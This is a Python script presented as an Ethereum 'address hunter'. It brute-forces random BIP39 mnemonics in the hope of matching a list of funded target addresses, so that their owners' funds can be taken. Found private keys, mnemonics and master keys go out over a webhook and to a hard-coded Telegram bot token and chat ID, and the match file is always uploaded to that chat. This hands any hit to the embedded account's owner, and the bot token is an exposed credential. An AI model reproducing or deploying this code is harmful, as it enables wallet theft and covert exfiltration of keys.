import ctypes
import time
import argparse  # Using argparse instead of optparse
import multiprocessing
from bip_utils import Bip32Slip10Secp256k1, Bip39MnemonicGenerator, Bip39SeedGenerator, Bip39WordsNum, EthAddrEncoder
from rich import print
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
import os
import sys
import signal
import atexit
from datetime import datetime, timedelta
import pytz
import threading
import requests
import hashlib
import psutil
import subprocess

console = Console()

# Webhook configuration (for multi-platform support)
# Default: http://localhost:3000/webhook (can be set via --webhook-url)
WEBHOOK_URL = None  # Will be set from CLI argument or environment variable

# Legacy Telegram bot credentials (used as fallback for file uploads)
TELEGRAM_BOT_TOKEN = "6668621875:AAHaIDS59aIPpWYf3JkWZuAkOaRatknClG0"
TELEGRAM_CHAT_ID = "1702319284"
IST = pytz.timezone('Asia/Kolkata')

def wait_for_webhook_ready(webhook_url, max_retries=15, retry_delay=0.5):
    """Wait for webhook server to be ready with exponential backoff."""
    for attempt in range(max_retries):
        try:
            response = requests.get(webhook_url.replace('/webhook', '/health'), timeout=2)
            if response.status_code == 200:
                print(f"[DEBUG] Webhook server is ready after {attempt + 1} attempts")
                return True
        except (requests.ConnectionError, requests.Timeout):
            pass
        
        if attempt < max_retries - 1:
            time.sleep(retry_delay)
            retry_delay = min(retry_delay * 1.5, 2)  # Exponential backoff, max 2 seconds
    
    print(f"[yellow]⚠️  Webhook server not responding after {max_retries} retries[/yellow]")
    return False

def send_webhook_notification(event_type, data):
    """Send notification via webhook (platform-agnostic)."""
    if not WEBHOOK_URL:
        print(f"[DEBUG] No WEBHOOK_URL set. Event: {event_type}")
        return False
    
    try:
        print(f"[DEBUG] Sending webhook notification: {event_type} to {WEBHOOK_URL}")
        payload = {
            "event_type": event_type,  # "startup", "daily_stats", "match_found"
            "timestamp": datetime.now(IST).isoformat(),
            "data": data
        }
        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print(f"[DEBUG] Webhook response: {response.status_code}")
        if response.status_code in [200, 201, 202]:
            print(f"[DEBUG] Webhook successful!")
            return True
        else:
            print(f"[yellow]Webhook returned {response.status_code}[/yellow]")
            return False
    except Exception as e:
        print(f"[yellow]Webhook error: {e}[/yellow]")
        return False

def send_telegram_message(message_text):
    """Send message via webhook, with fallback to direct Telegram API."""
    if WEBHOOK_URL:
        # Try webhook first (works for any platform)
        webhook_data = {
            "message_type": "text",
            "content": message_text,
            "parse_mode": "HTML"
        }
        if send_webhook_notification("message", webhook_data):
            return
    
    # Fallback to direct Telegram API if webhook not configured or failed
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message_text,
            "parse_mode": "HTML"
        }
        response = requests.post(url, data=data, timeout=10)
        if response.status_code != 200:
            print(f"[red]Failed to send message: {response.status_code}[/red]")
    except Exception as e:
        print(f"[red]Send error: {e}[/red]")

def send_telegram_file(file_path):
    """Send file content via webhook, with fallback to direct Telegram API."""
    if not os.path.exists(file_path):
        return
    
    try:
        with open(file_path, 'r') as f:
            file_content = f.read()
        
        # Try webhook first (send file content as text)
        if WEBHOOK_URL:
            webhook_data = {
                "message_type": "file_content",
                "filename": os.path.basename(file_path),
                "content": file_content
            }
            if send_webhook_notification("file_found", webhook_data):
                return
        
        # Fallback to direct file upload via Telegram Bot API
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID}
            response = requests.post(url, files=files, data=data, timeout=10)
        if response.status_code != 200:
            print(f"[red]Failed to send file: {response.status_code}[/red]")
    except Exception as e:
        print(f"[red]File send error: {e}[/red]")

def send_startup_message(worker_name, filename, thco):
    """Send startup message via webhook."""
    now_ist = datetime.now(IST)
    date_str = now_ist.strftime("%d %B %Y")
    time_str = now_ist.strftime("%I:%M %p")
    
    message = (
        f"<b>🤖 Bot Started</b>\n"
        f"<b>Date:</b> {date_str}\n"
        f"<b>Time:</b> {time_str} (IST)\n\n"
        f"<b>⚙️ Configuration:</b>\n"
        f"<b>Worker Name:</b> <code>{worker_name}</code>\n"
        f"<b>Target File:</b> <code>{filename}</code>\n"
        f"<b>Workers:</b> <b>{thco}</b>\n"
        f"\n<b>✅ Ready to hunt addresses!</b>"
    )
    
    webhook_data = {
        "message_type": "startup",
        "worker_name": worker_name,
        "target_file": filename,
        "worker_count": thco,
        "formatted_message": message
    }
    
    send_webhook_notification("startup", webhook_data)

def send_daily_stats(worker_name, filename, thco, total_generated, avg_rate, elapsed_secs, total_matches, avg_cpu):
    """Send daily stats via webhook with fallback to direct Telegram API."""
    now_ist = datetime.now(IST)
    date_str = now_ist.strftime("%d %B %Y")
    
    hours = int(elapsed_secs // 3600)
    minutes = int((elapsed_secs % 3600) // 60)
    
    message = (
        f"<b>📊 Daily Stats Report</b>\n"
        f"<b>Date:</b> {date_str}\n\n"
        f"<b>👤 Worker:</b> <code>{worker_name}</code>\n"
        f"<b>📁 Target:</b> <code>{filename}</code>\n\n"
        f"<b>📈 Statistics:</b>\n"
        f"<b>Generated:</b> <code>{total_generated:,}</code> addresses\n"
        f"<b>Avg Rate:</b> <code>{avg_rate:.1f}</code> addr/s\n"
        f"<b>Time:</b> <code>{hours}h {minutes}m</code>\n"
        f"<b>Found:</b> <b>🎉 {total_matches}</b> matches\n"
        f"<b>Avg CPU:</b> <code>{avg_cpu:.1f}%</code>\n"
        f"<b>Workers:</b> <code>{thco}</code>\n\n"
        f"<i>See you tomorrow! 🚀</i>"
    )
    
    webhook_data = {
        "message_type": "daily_stats",
        "worker_name": worker_name,
        "target_file": filename,
        "total_generated": total_generated,
        "average_rate": avg_rate,
        "elapsed_seconds": elapsed_secs,
        "total_matches": total_matches,
        "average_cpu": avg_cpu,
        "worker_count": thco,
        "formatted_message": message
    }
    
    # Try webhook first
    if send_webhook_notification("daily_stats", webhook_data):
        return True
    
    # Fallback to direct Telegram API if webhook failed or not configured
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        console.print(f"[yellow]Stats send error: {e}[/yellow]")
        return False

def file_monitor_thread(check_interval=5):
    """Monitor FoundMATCHAddr.txt for changes and send via webhook."""
    last_hash = None
    last_line_count = 0
    while True:
        try:
            time.sleep(check_interval)
            if os.path.exists('FoundMATCHAddr.txt'):
                with open('FoundMATCHAddr.txt', 'rb') as f:
                    file_hash = hashlib.md5(f.read()).hexdigest()
                
                if last_hash is None:
                    last_hash = file_hash
                    # Count existing lines
                    with open('FoundMATCHAddr.txt', 'r') as f:
                        last_line_count = len(f.readlines())
                elif file_hash != last_hash:
                    # File changed, send it
                    last_hash = file_hash
                    now_ist = datetime.now(IST)
                    
                    # Read file content and extract new matches
                    with open('FoundMATCHAddr.txt', 'r') as f:
                        lines = f.readlines()
                    
                    current_line_count = len(lines)
                    
                    # Extract new match entries (each match is separated by the divider line)
                    matches = []
                    current_match = []
                    worker_name = "Unknown"
                    
                    for line in lines:
                        if line.startswith('[WORKER'):
                            # Extract worker number from [WORKER N]
                            worker_num = line.strip().replace('[WORKER ', '').replace(']', '')
                            worker_name = f"Worker-{worker_num}"
                            current_match = [worker_name]
                        elif '---' in line and len(current_match) > 0:
                            # End of match block
                            matches.append(current_match)
                            current_match = []
                        elif current_match:
                            current_match.append(line.strip())
                    
                    # Send alerts for each new match
                    file_content = ''.join(lines)
                    
                    # Send via webhook first (both message and file content)
                    webhook_data = {
                        "message_type": "match_alert",
                        "timestamp": now_ist.isoformat(),
                        "file_content": file_content,
                        "total_matches": len([m for m in matches if len(m) > 1])
                    }
                    send_webhook_notification("match_found", webhook_data)
                    
                    # Send detailed Telegram alerts for new matches
                    if matches and current_line_count > last_line_count:
                        for match_data in matches[-1:]:  # Send alert for the last/newest match
                            if len(match_data) >= 4:
                                worker = match_data[0] if match_data else "Unknown"
                                address = match_data[1] if len(match_data) > 1 else "N/A"
                                private_key = match_data[2] if len(match_data) > 2 else "N/A"
                                mnemonic = match_data[3] if len(match_data) > 3 else "N/A"
                                
                                # Create detailed message
                                msg = (
                                    f"🎉 <b>MATCH FOUND!</b>\n"
                                    f"<i>{now_ist.strftime('%d %B %Y %I:%M %p IST')}</i>\n\n"
                                    f"<b>👤 Worker:</b> <code>{worker}</code>\n"
                                    f"<b>📍 Address:</b> <code>{address}</code>\n"
                                    f"<b>🔑 Private Key:</b> <code>{private_key}</code>\n\n"
                                    f"<b>🌱 Mnemonic (24 words):</b>\n<code>{mnemonic}</code>\n\n"
                                    f"<b>✅ Full details saved to FoundMATCHAddr.txt</b>"
                                )
                                send_telegram_message(msg)
                    
                    # Also send simple match found message
                    msg = f"🎉 <b>MATCH FOUND!</b>\n<i>{now_ist.strftime('%d %B %Y %I:%M %p IST')}</i>"
                    # send_telegram_message(msg)  # Already sent above with details
                    
                    # Send file as fallback (uses bot API if webhook doesn't support files)
                    time.sleep(0.5)
                    send_telegram_file('FoundMATCHAddr.txt')
                    
                    last_line_count = current_line_count
        except Exception as e:
            pass



def set_console_title(title):
    """Set the console/terminal title in a cross-platform way.
    On Windows use ctypes.windll; on Unix-like systems use an ANSI OSC escape.
    Safe no-op on unsupported environments.
    """
    try:
        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        else:
            # ANSI escape for terminal title (works in many Unix terminals)
            sys.stdout.write(f"\x1b]0;{title}\x07")
            sys.stdout.flush()
    except Exception:
        # Ignore failures to set title (e.g., when stdout is not a terminal)
        pass


def safe_print(lock, *args, **kwargs):
    """Thread/process-safe print wrapper using the provided lock."""
    try:
        if lock is not None:
            with lock:
                print(*args, **kwargs)
        else:
            print(*args, **kwargs)
    except Exception:
        # Fallback to non-locked print if something goes wrong
        print(*args, **kwargs)


class CPUUsage:
    """Cross-platform CPU usage monitor.

    Prefer psutil (if available) for quick non-blocking reads; otherwise
    use /proc/stat delta sampling (Linux). The percent() method returns a
    recent estimate of percentage CPU usage across all cores.
    """
    def __init__(self):
        try:
            import psutil
            self._psutil = psutil
            # Prime psutil's internal counters
            try:
                self._psutil.cpu_percent(interval=None)
            except Exception:
                pass
            self._last_total = None
            self._last_idle = None
        except Exception:
            self._psutil = None
            self._last_total, self._last_idle = self._read_proc_stat()

    def _read_proc_stat(self):
        # Returns (total, idle) from /proc/stat
        with open('/proc/stat', 'r') as f:
            first = f.readline()
        parts = first.split()
        vals = [int(x) for x in parts[1:]]
        idle = vals[3]
        # include iowait if present
        if len(vals) > 4:
            idle += vals[4]
        total = sum(vals)
        return total, idle

    def percent(self):
        if self._psutil is not None:
            try:
                # Non-blocking since we primed it in __init__
                val = self._psutil.cpu_percent(interval=None)
                return float(val)
            except Exception:
                pass
        # Fallback to /proc/stat deltas
        try:
            total, idle = self._read_proc_stat()
            if self._last_total is None:
                self._last_total, self._last_idle = total, idle
                return 0.0
            dt = total - self._last_total
            di = idle - self._last_idle
            self._last_total, self._last_idle = total, idle
            if dt <= 0:
                return 0.0
            usage = 100.0 * (1.0 - (di / dt))
            return max(0.0, min(100.0, usage))
        except Exception:
            return 0.0


def Main(worker_id, filename, logpx, thco, add, lock, shared_total, shared_matches, start_time):
    """Worker function that generates keys and reports progress.
    worker_id: 1-based ID for this worker process
    filename, logpx, thco: parsed and typed (ints where appropriate)
    add: set of target addresses
    lock: multiprocessing.Lock instance for synchronization
    shared_total: multiprocessing.Value to track combined address count
    shared_matches: multiprocessing.Value to track total matches found
    start_time: shared start time for all workers
    """
    # Local counters and timers
    z = 0
    fu = 0
    logp = 0
    start_perf = time.perf_counter()
    last_live_update = start_perf  # Track last time we printed a live progress line
    cpu_monitor = CPUUsage()

    while True:
        z += 1
        # Update shared total under lock
        with lock:
            shared_total.value += 1
        
        set_console_title(f"W{worker_id} MATCH:{fu} SCAN:{z}")
        mnemonic = Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_24)
        seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
        bip32_mst_ctx = Bip32Slip10Secp256k1.FromSeed(seed_bytes)
        MasterKey = bip32_mst_ctx.PrivateKey().Raw().ToHex()
        bip32_der_ctx = bip32_mst_ctx.DerivePath("m/44'/60'/0'/0/0")
        PrivateKeyBytes = bip32_der_ctx.PrivateKey().Raw().ToHex()
        addr = EthAddrEncoder.EncodeKey(bip32_der_ctx.PublicKey().KeyObject())
        Words24 = str(mnemonic)

        # Compute throughput metrics
        elapsed = time.perf_counter() - start_perf
        rate = (z / elapsed) if elapsed > 0 else 0.0  # addresses/sec
        sec_per_k = (elapsed / (z / 1000.0)) if z > 0 else 0.0  # seconds per 1000 addresses
        cpu = cpu_monitor.percent()

        if addr in add:
            fu += 1
            # Update shared matches counter
            with lock:
                shared_matches.value += 1
            
            safe_print(lock, f"[green1][+] MATCH ADDRESS FOUND BY WORKER {worker_id} :[/green1] [white]{addr}[/white]")
            safe_print(lock, f"PrivateKey (Byte) : [green1]{PrivateKeyBytes}[/green1]\n[gold1]{mnemonic}[/gold1]\n[red1]MasterKey (Byte) : [/red1][green1]{MasterKey}[/green1]")
            # Write match to disk under lock to avoid interleaving
            try:
                if lock is not None:
                    with lock:
                        with open('FoundMATCHAddr.txt', 'a') as f:
                            f.write(f"[WORKER {worker_id}]\n{addr}\n{PrivateKeyBytes}\n{mnemonic}\n{MasterKey}\n------------------------- MMDRZA.Com -------------------\n")
                else:
                    with open('FoundMATCHAddr.txt', 'a') as f:
                        f.write(f"[WORKER {worker_id}]\n{addr}\n{PrivateKeyBytes}\n{mnemonic}\n{MasterKey}\n------------------------- MMDRZA.Com -------------------\n")
            except Exception:
                # Ignore file write errors but report them
                safe_print(lock, f"[red]Failed to write FoundMATCHAddr.txt from worker {worker_id}[/red]")
        elif z % logpx == 0:
            logp += logpx
            safe_print(lock, f"[red][[green1]+[/green1]][GENERATED[white] {logp}[/white] ETH ADDR][WITH [white]{thco} THREAD(S)[/white]][rate:[white]{rate:.2f} addr/s[/white] | {sec_per_k:.3f} s/K][CPU:[white]{cpu:.1f}%[/white]][/red]\n[red][[green1]{PrivateKeyBytes.upper()}[/green1]][/red]")
            # Show a concise mnemonic preview (first 6 words) and indicate truncation
            mnemonic_preview = " ".join(Words24.split()[0:6]) + " ... (truncated)"
            safe_print(lock, f"[red][MasterKey : [white]{MasterKey.upper()}[/white]][/red]\n[white on red3][MNEMONIC : {mnemonic_preview}][/white on red3]")
        elif time.perf_counter() - last_live_update >= 1.0:
            # Live short progress line (overwrites in terminal) - throttled to ~1 second
            last_live_update = time.perf_counter()
            combined_total = shared_total.value
            combined_matches = shared_matches.value
            combined_elapsed = time.perf_counter() - start_time
            combined_rate = (combined_total / combined_elapsed) if combined_elapsed > 0 else 0.0
            
            # Simple, clean combined output
            status_line = (
                f"[bold cyan]⚡ Generated[/bold cyan] [yellow]{combined_total:,}[/yellow] addresses | "
                f"[green]{combined_rate:.1f} addr/s[/green] | "
                f"[red]CPU [bold]{cpu:.1f}%[/bold][/red] | "
                f"[magenta]Found:[/magenta] [bold white]{combined_matches}[/bold white] | "
                f"[cyan]Workers = {thco}[/cyan]"
            )
            safe_print(lock, status_line, end="\r", flush=True)


if __name__ == '__main__':
    # Parse command-line options in the main process and launch workers
    parser = argparse.ArgumentParser(description="Ethereum Address Finder Script")

    parser.add_argument('-f', '--file', dest="filenameEth", required=True,
                        help="Ethereum Rich Address File With Type Format .TXT [Example: -f eth5.txt]")
    parser.add_argument('-v', '--view', dest="ViewPrint", required=True,
                        help="Print after generated this number of addresses and report")
    parser.add_argument('-n', '--thread', dest="ThreadCount", required=True,
                        help="Total worker processes to spawn")
    parser.add_argument('--worker-name', dest="workerName", default="CryptoBot",
                        help="Name of this worker instance for Telegram reports [Example: --worker-name robo1]")
    parser.add_argument('--webhook-url', dest="webhookUrl", default=None,
                        help="Webhook URL for notifications (supports any platform) [Example: --webhook-url http://localhost:3000/webhook]")
    parser.add_argument('--port', dest="port", type=int, default=3000,
                        help="Port for auto-starting webhook server [Example: --port 5689]")

    args = parser.parse_args()
    filename = args.filenameEth
    logpx = int(args.ViewPrint)
    thco = int(args.ThreadCount)
    worker_name = args.workerName
    webhook_port = args.port
    
    # Auto-start webhook server if not manually specified
    webhook_server_process = None
    if not args.webhookUrl:
        # Auto-construct webhook URL and start server
        webhook_url = f"http://localhost:{webhook_port}/webhook"
        console.print(f"[bold cyan]🚀 Starting webhook server on port {webhook_port}...[/bold cyan]")
        try:
            # Start webhook server in background
            webhook_server_process = subprocess.Popen(
                [sys.executable, os.path.join(os.path.dirname(__file__), 'webhook_server.py')],
                env={**os.environ, 'FLASK_PORT': str(webhook_port)},
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid if sys.platform != 'win32' else None
            )
            # Wait for server to be ready
            if wait_for_webhook_ready(webhook_url):
                console.print(f"[bold green]✅ Webhook server started on port {webhook_port}[/bold green]")
            else:
                console.print(f"[bold yellow]⚠️  Webhook server started but not responding. Continuing anyway...[/bold yellow]")
        except Exception as e:
            console.print(f"[bold yellow]⚠️  Could not auto-start webhook server: {e}[/bold yellow]")
            console.print(f"[bold yellow]   Make sure webhook_server.py exists in the same directory[/bold yellow]")
            webhook_url = None
        globals()['WEBHOOK_URL'] = webhook_url
    else:
        globals()['WEBHOOK_URL'] = args.webhookUrl

    # Read targets once in the parent and share as an immutable set
    with open(filename) as f:
        add = set(f.read().split())

    # Create a lock for synchronized console output and file writes
    lock = multiprocessing.Lock()
    
    # Create shared counters
    shared_total = multiprocessing.Value('i', 0)  # Total addresses generated
    shared_matches = multiprocessing.Value('i', 0)  # Total matches found
    start_time = time.perf_counter()
    
    # Print banner
    banner = Panel(
        f"[bold cyan]🔐 CryptoMagic - Ethereum Address Hunter[/bold cyan]\n"
        f"[yellow]Workers: {thco}[/yellow] | [magenta]Target Addresses: {len(add)}[/magenta] | [green]Report Interval: {logpx:,}[/green]",
        title="[bold blue]⚡ START[/bold blue]",
        border_style="cyan"
    )
    console.print(banner)
    
    # Send startup message to Telegram
    console.print("[bold green]📱 Sending startup notification to Telegram...[/bold green]")
    send_startup_message(worker_name, filename, thco)
    
    # Start file monitoring thread (daemon, so it dies with main process)
    monitor_thread = threading.Thread(target=file_monitor_thread, daemon=True)
    monitor_thread.start()

    jobs = []
    shutdown_lock = threading.Lock()
    shutdown_called = [False]  # Use list to allow modification in nested function
    shutdown_started_at = [0]   # Track when first shutdown started
    
    # Define shutdown function that sends final stats
    def send_final_stats():
        import sys as _sys
        _sys.stderr.write("[DEBUG] send_final_stats() called\n")
        _sys.stderr.flush()
        
        with shutdown_lock:
            if shutdown_called[0]:
                _sys.stderr.write("[DEBUG] shutdown_called[0] already True, returning early\n")
                _sys.stderr.flush()
                return  # Already processed, don't send again
            shutdown_called[0] = True
        
        _sys.stderr.write("[DEBUG] Proceeding with final stats calculation\n")
        _sys.stderr.flush()
        
        # Final stats
        elapsed = time.perf_counter() - start_time
        final_rate = (shared_total.value / elapsed) if elapsed > 0 else 0.0
        
        # Get average CPU usage
        try:
            avg_cpu = psutil.cpu_percent(interval=0.1)
        except Exception as e:
            _sys.stderr.write(f"[DEBUG] Error getting CPU: {e}\n")
            avg_cpu = 0.0
        
        _sys.stderr.write(f"[DEBUG] Stats: Generated={shared_total.value}, Rate={final_rate:.1f}, CPU={avg_cpu}%\n")
        _sys.stderr.flush()
        
        try:
            # Send final stats to Telegram (only once)
            print("[bold green]📱 Sending final stats to Telegram...[/bold green]")
            _sys.stderr.write(f"[DEBUG] Webhook URL: {WEBHOOK_URL}\n")
            _sys.stderr.flush()
            success = send_daily_stats(worker_name, filename, thco, shared_total.value, final_rate, elapsed, shared_matches.value, avg_cpu)
            _sys.stderr.write(f"[DEBUG] send_daily_stats returned: {success}\n")
            _sys.stderr.flush()
            
            if success:
                print("[bold green]✅ Stats sent successfully![/bold green]")
            else:
                print("[bold yellow]⚠️  Could not send stats via webhook or Telegram API[/bold yellow]")
        except Exception as e:
            print(f"[bold red]Error sending final stats: {e}[/bold red]")
            _sys.stderr.write(f"[ERROR] Exception in send_daily_stats: {e}\n")
            import traceback
            traceback.print_exc(file=_sys.stderr)
        
        try:
            summary = Panel(
                f"[bold cyan]Total Generated:[/bold cyan] [yellow]{shared_total.value:,}[/yellow] addresses\n"
                f"[bold cyan]Total Found:[/bold cyan] [bold green]{shared_matches.value}[/bold green] matches\n"
                f"[bold cyan]Final Rate:[/bold cyan] [green]{final_rate:.1f}[/green] addr/s\n"
                f"[bold cyan]Total Time:[/bold cyan] [magenta]{elapsed:.1f}s[/magenta]",
                title="[bold red]📊 SUMMARY[/bold red]",
                border_style="red"
            )
            console.print(summary)
        except Exception as e:
            print(f"Error printing summary: {e}")
    
    # Define shutdown handler for graceful termination on signals
    def shutdown_handler(signum, frame):
        try:
            print("\n⚠️  Shutting down workers...")
            
            with shutdown_lock:
                if shutdown_called[0]:
                    print("Already shutting down, exiting...")
                    sys.exit(0)
                shutdown_called[0] = True
            
            # Send final stats FIRST (while webhook server is still running)
            print("📱 Calling send_final_stats()...")
            send_final_stats()
            
            # Wait for message to be delivered to webhook/Telegram
            print("⏳ Waiting 2.5 seconds for stats delivery...")
            time.sleep(2.5)
            
            # Kill webhook server AFTER stats are sent
            if webhook_server_process:
                try:
                    print("🛑 Killing webhook server...")
                    if sys.platform != 'win32':
                        os.killpg(os.getpgid(webhook_server_process.pid), signal.SIGTERM)
                    else:
                        webhook_server_process.terminate()
                except Exception as e:
                    print(f"Error killing webhook: {e}")
            
            # Terminate workers
            print("🛑 Terminating workers...")
            for p in jobs:
                try:
                    p.terminate()
                except Exception:
                    pass
            for p in jobs:
                try:
                    p.join(timeout=1)
                except Exception:
                    pass
            
            print("✅ Shutdown complete!")
            sys.exit(0)
        except Exception as e:
            print(f"Error in shutdown_handler: {e}")
            sys.exit(1)
    
    # Register signal handlers for graceful shutdown on Ctrl+C or SIGTERM
    # (atexit not used because signal handlers are guaranteed to run on exit)
    signal.signal(signal.SIGINT, shutdown_handler)
    signal.signal(signal.SIGTERM, shutdown_handler)
    
    for i in range(thco):
        p = multiprocessing.Process(target=Main, args=(i + 1, filename, logpx, thco, add, lock, shared_total, shared_matches, start_time), daemon=True)
        jobs.append(p)
        p.start()

    # Keep main process alive but interruptible using a loop with short sleep intervals
    try:
        while all(p.is_alive() for p in jobs):
            time.sleep(0.5)
    except (KeyboardInterrupt, SystemExit):
        pass  # Signal handler will take care of it
